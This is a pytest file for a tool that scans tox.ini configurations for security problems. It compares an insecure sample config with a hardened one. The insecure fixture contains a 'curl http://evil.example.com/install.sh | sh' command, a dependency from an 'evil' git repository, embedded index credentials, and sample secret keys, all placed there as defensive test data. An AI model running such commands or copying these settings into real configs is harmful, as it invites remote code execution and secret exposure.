"""Tests for ToxAnalyzer."""

from pathlib import Path

from devai.tox_analyzer import ToxAnalyzer, ToxFinding


INSECURE_TOX_INI = """\
[tox]
envlist = py310, security
isolated_build = false
skip_missing_interpreters = true

[indexserver]
pypi = https://user:password123@pypi.example.com/simple

[testenv]
passenv = *
allowlist_externals = *
ignore_errors = true
changedir = ../outside
deps =
    git+http://github.com/evil/pkg.git#egg=evil
commands =
    curl http://evil.example.com/install.sh | sh
    eval("print('bad')")
setenv =
    API_KEY = api_key=hardcoded_secret_value_12345
    AWS_ACCESS_KEY = AKIAIOSFODNN7EXAMPLE
install_command = pip install --index-url http://insecure.example.com/simple {opts} {packages}
"""

HARDENED_TOX_INI = """\
[tox]
envlist = py310, py311
isolated_build = true
skip_missing_interpreters = false
requires =
    tox>=4

[testenv]
deps =
    -r{toxinidir}/requirements-test.txt
commands =
    pytest {posargs:tests}
passenv =
    CI
allowlist_externals =
    pytest
"""


class TestToxAnalyzer:
    def test_detects_insecure_tox_ini(self, tmp_path: Path):
        (tmp_path / "tox.ini").write_text(INSECURE_TOX_INI, encoding="utf-8")
        analyzer = ToxAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds
        assert "aws_access_key" in kinds
        assert "passenv_wildcard" in kinds
        assert "allowlist_wildcard" in kinds
        assert "ignore_errors" in kinds
        assert "skip_missing_interpreters" in kinds
        assert "changedir_outside" in kinds
        assert "insecure_git_deps" in kinds
        assert "dangerous_command" in kinds
        assert "indexserver_credentials" in kinds
        assert "insecure_pip_index" in kinds
        assert "isolated_build_disabled" in kinds
        assert analyzer.health_score() < 50.0

    def test_hardened_config_scores_well(self, tmp_path: Path):
        (tmp_path / "tox.ini").write_text(HARDENED_TOX_INI, encoding="utf-8")
        analyzer = ToxAnalyzer(str(tmp_path))
        analyzer.analyze()
        assert analyzer.health_score() >= 90.0

    def test_no_configs_returns_perfect_score(self, tmp_path: Path):
        analyzer = ToxAnalyzer(str(tmp_path))
        assert analyzer.health_score() == 100.0
        assert analyzer.summary() == "Tox configs: none found"

    def test_finding_format(self):
        finding = ToxFinding(
            kind="hardcoded_secret",
            severity="high",
            message="test",
            path="tox.ini",
            lineno=2,
        )
        assert "[high] tox.ini:2" in finding.format()

    def test_generate_hardened_template(self):
        template = ToxAnalyzer(".").generate_hardened_template()
        assert "isolated_build = true" in template
        assert "skip_missing_interpreters = false" in template

    def test_to_context(self, tmp_path: Path):
        (tmp_path / "tox.ini").write_text(INSECURE_TOX_INI, encoding="utf-8")
        context = ToxAnalyzer(str(tmp_path)).to_context()
        assert "Tox analysis:" in context
        assert "health score:" in context
